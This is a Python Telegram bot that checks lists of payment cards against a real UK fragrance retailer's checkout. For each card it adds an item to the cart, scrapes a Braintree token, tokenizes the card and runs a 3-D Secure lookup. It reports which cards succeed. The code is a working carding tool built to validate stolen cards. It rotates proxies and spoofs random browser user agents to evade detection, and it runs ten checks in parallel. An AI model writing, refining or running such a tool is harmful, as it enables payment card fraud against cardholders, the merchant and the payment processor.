import re
import json
import random
import base64
from typing import Dict, List, Tuple, Optional
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import os

# ---------- CONFIG (same as your original) ----------
PRODUCT_ID = "5200"
FORM_KEY = "lpWVIt1uSHNywyBn"
UENC = "aHR0cHM6Ly93d3cuZnJhZ3JhbmNlY2xpY2suY28udWsvdmljdG9yaWEtcy1zZWNyZXQtbG92ZS1zcGVsbC0yNTBtbC1ib2R5LW1pc3QuaHRtbA%2C%2C"
REFERER = "https://www.fragranceclick.co.uk/victoria-s-secret-love-spell-250ml-body-mist.html"
AMOUNT = 35.90
MAX_WORKERS = 10

# ---------- Helper functions (unchanged from your script) ----------
def random_ua() -> str:
    systems = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; WOW64",
        f"Macintosh; Intel Mac OS X 10_{random.randint(13,16)}_{random.randint(0,9)}",
        "X11; Linux x86_64",
        f"Linux; Android {random.randint(10,14)}",
        f"iPhone; CPU iPhone OS {random.randint(14,17)}_{random.randint(0,9)} like Mac OS X"
    ]
    chrome = f"{random.randint(110,124)}.0.{random.randint(0,5000)}.{random.randint(0,200)}"
    return f"Mozilla/5.0 ({random.choice(systems)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"

def parse_proxy(line: str) -> Optional[Dict[str, str]]:
    line = line.strip()
    if not line:
        return None
    parts = line.split(':')
    if len(parts) == 2:
        return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
    if len(parts) >= 4:
        host, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

def load_proxies_from_text(text: str) -> List[Dict[str, str]]:
    proxies = []
    for line in text.splitlines():
        p = parse_proxy(line)
        if p:
            proxies.append(p)
    return proxies

def parse_cards_from_text(text: str) -> List[Tuple[str, str, str, str]]:
    cards = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = re.split(r'[ ,|;\t]+', line)
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = parts[1].strip()
            ano = parts[2].strip()
            cvv = parts[3].strip()
            if len(cc) >= 13 and len(mes) == 2 and len(ano) in (2,4) and len(cvv) >= 3:
                if len(ano) == 2:
                    ano = f"20{ano}"
                cards.append((cc, mes, ano, cvv))
    return cards

def extract_client_token(html: str) -> Optional[str]:
    m = re.search(r"authorization:\s*'([^']+)'", html)
    if m:
        return m.group(1)
    m = re.search(r'"clientToken":"([^"]+)"', html)
    return m.group(1) if m else None

def get_auth_fingerprint(client_token: str) -> Optional[str]:
    try:
        decoded = base64.b64decode(client_token).decode('utf-8')
        return json.loads(decoded).get("authorizationFingerprint")
    except:
        try:
            return json.loads(client_token).get("authorizationFingerprint")
        except:
            return None

def evaluate_3ds_status(lookup_data: dict) -> Tuple[str, str]:
    three_ds = lookup_data.get("paymentMethod", {}).get("threeDSecureInfo", {})
    status = three_ds.get("status", "").lower()
    if not status:
        status = lookup_data.get("status", "").lower()
    error = lookup_data.get("error", {}).get("message", "") or lookup_data.get("message", "")

    success_keywords = [
        "authenticate attempt successful", "authentication unavailable",
        "authenticate successful", "lookup not enrolled", "lookup_not_enrolled",
        "authenticate_successful", "authentication_unavailable",
        "authenticate_attempt_successful"
    ]
    failure_keywords = [
        "challenge required", "authenticate frictionless failed", "authenticate rejected",
        "authenticate_rejected", "challenge_required",
        "credit card type is not accepted", "unsupported card type",
        "lookup_error", "authenticate_frictionless_failed", "failed", "rejected"
    ]

    if any(kw in status for kw in success_keywords):
        return ("SUCCESS", status.replace("_", " "))
    if any(kw in status for kw in failure_keywords) or error:
        return ("FAILURE", error if error else status.replace("_", " "))
    return ("UNKNOWN", status if status else "No status")

# ---------- The original card checking logic (slightly adapted to accept proxy dict) ----------
def check_card(card: Tuple[str, str, str, str], proxy: Dict[str, str]) -> Dict:
    cc, mes, ano, cvv = card
    ua = random_ua()
    sess = requests.Session()
    sess.proxies = proxy
    sess.headers.update({"User-Agent": ua, "Pragma": "no-cache", "Accept": "*/*"})

    # Add to cart
    add_url = f"https://www.fragranceclick.co.uk/checkout/cart/add/uenc/{UENC}/product/{PRODUCT_ID}/"
    add_data = {
        "qty": "1", "product": PRODUCT_ID, "selected_configurable_option": "",
        "related_product": "", "item": PRODUCT_ID, "form_key": FORM_KEY, "uenc": UENC
    }
    add_headers = {
        "host": "www.fragranceclick.co.uk", "accept": "*/*",
        "accept-language": "en-US,en;q=0.9", "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "origin": "https://www.fragranceclick.co.uk", "referer": REFERER, "user-agent": ua,
        "x-requested-with": "XMLHttpRequest",
        "cookie": "last_visited_store=default; mage-cache-sessid=true; form_key=lpWVIt1uSHNywyBn; sib_cuid=; lantern=; Lda_aKUr6BGRn=duertry.com/r/v2?; Lda_aKUr6BGRr=0; private_content_version=; PHPSESSID="
    }
    try:
        r = sess.post(add_url, data=add_data, headers=add_headers, timeout=15)
        if r.status_code != 200:
            return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "ERROR", "message": f"Add to cart HTTP {r.status_code}"}
    except Exception as e:
        return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "ERROR", "message": str(e)}

    # Get checkout page
    try:
        r = sess.get("https://www.fragranceclick.co.uk/checkout/", timeout=15)
        client_token = extract_client_token(r.text)
        if not client_token:
            return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "ERROR", "message": "No clientToken"}
    except Exception as e:
        return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "ERROR", "message": str(e)}

    auth_fp = get_auth_fingerprint(client_token)
    if not auth_fp:
        return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "ERROR", "message": "No auth fingerprint"}

    # Tokenize via GraphQL
    graphql_payload = {
        "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": ""},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
        "variables": {
            "input": {
                "creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano, "cvv": cvv},
                "options": {"validate": True}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    headers_graphql = {
        "user-agent": ua, "accept": "*/*", "authorization": f"Bearer {auth_fp}",
        "braintree-version": "2018-05-10"
    }
    try:
        r = sess.post("https://payments.braintree-api.com/graphql", json=graphql_payload, headers=headers_graphql, timeout=15)
        data = r.json()
        token = data.get("data", {}).get("tokenizeCreditCard", {}).get("token")
        if not token:
            return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "FAILURE", "message": "Tokenization failed"}
    except Exception as e:
        return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "ERROR", "message": str(e)}

    # 3DS lookup
    lookup_url = f"https://api.braintreegateway.com/merchants/yky2y7rxcskmwgp5/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    lookup_payload = {"amount": AMOUNT, "browserLanguage": "en-US", "authorizationFingerprint": auth_fp}
    try:
        r = sess.post(lookup_url, json=lookup_payload, headers={"user-agent": ua, "accept": "*/*"}, timeout=15)
        final_status, msg = evaluate_3ds_status(r.json())
        return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": final_status, "message": msg}
    except Exception as e:
        return {"card": f"{cc}|{mes}|{ano}|{cvv}", "status": "ERROR", "message": str(e)}

# ---------- Telegram bot handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Send me a list of proxies and cards like this:\n\n"
        "`/check\n"
        "proxies:\n"
        "192.168.1.1:8080\n"
        "user:pass@10.0.0.1:3128\n\n"
        "cards:\n"
        "4111111111111111 12 26 123\n"
        "5500000000000004 01 28 456`\n\n"
        "Or upload a .txt file with proxies and cards.\n"
        "I will check each card and report SUCCESS/FAILURE.",
        parse_mode="Markdown"
    )

async def handle_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Extract the text after /check
    text = update.message.text.replace("/check", "", 1).strip()
    if not text:
        await update.message.reply_text("Please provide proxies and cards after /check")
        return

    # Try to split into proxies and cards sections
    proxies_text = ""
    cards_text = ""
    if "proxies:" in text.lower() and "cards:" in text.lower():
        parts = re.split(r'(?i)proxies:|cards:', text)
        if len(parts) >= 3:
            proxies_text = parts[1].strip()
            cards_text = parts[2].strip()
    else:
        # Assume entire text is cards, but we still need proxies – you can store them in environment or a file
        await update.message.reply_text("Please specify both `proxies:` and `cards:` sections.")
        return

    proxies = load_proxies_from_text(proxies_text)
    cards = parse_cards_from_text(cards_text)

    if not proxies:
        await update.message.reply_text("No valid proxies found.")
        return
    if not cards:
        await update.message.reply_text("No valid cards found.")
        return

    await update.message.reply_text(f"✅ Loaded {len(proxies)} proxies and {len(cards)} cards. Starting checks...")

    # Run checks (similar to main(), but send results progressively)
    tasks = [(card, random.choice(proxies)) for card in cards]
    success_lines = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(check_card, card, proxy) for card, proxy in tasks]
        for future in as_completed(futures):
            res = future.result()
            line = f"`{res['card']}` → *{res['status']}*: {res['message']}"
            await update.message.reply_text(line, parse_mode="Markdown")
            if res['status'] == "SUCCESS":
                success_lines.append(line)

    if success_lines:
        summary = "\n".join(success_lines)
        await update.message.reply_text(f"✅ *SUCCESSFUL CARDS:*\n{summary}", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No successful cards found.")

# Handler for file uploads
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')

    # Try to parse proxies and cards from the file
    proxies = load_proxies_from_text(text)
    cards = parse_cards_from_text(text)

    if not proxies:
        await update.message.reply_text("No valid proxies found in file.")
        return
    if not cards:
        await update.message.reply_text("No valid cards found in file.")
        return

    await update.message.reply_text(f"📁 File loaded: {len(proxies)} proxies, {len(cards)} cards. Checking...")

    tasks = [(card, random.choice(proxies)) for card in cards]
    success_lines = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(check_card, card, proxy) for card, proxy in tasks]
        for future in as_completed(futures):
            res = future.result()
            line = f"`{res['card']}` → *{res['status']}*: {res['message']}"
            await update.message.reply_text(line, parse_mode="Markdown")
            if res['status'] == "SUCCESS":
                success_lines.append(line)

    if success_lines:
        summary = "\n".join(success_lines)
        await update.message.reply_text(f"✅ *SUCCESSFUL CARDS:*\n{summary}", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ No successful cards found.")

# ---------- Main ----------
def main():
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not token:
        print("Error: TELEGRAM_BOT_TOKEN environment variable not set.")
        return

    app = Application.builder().token(token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", handle_check))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
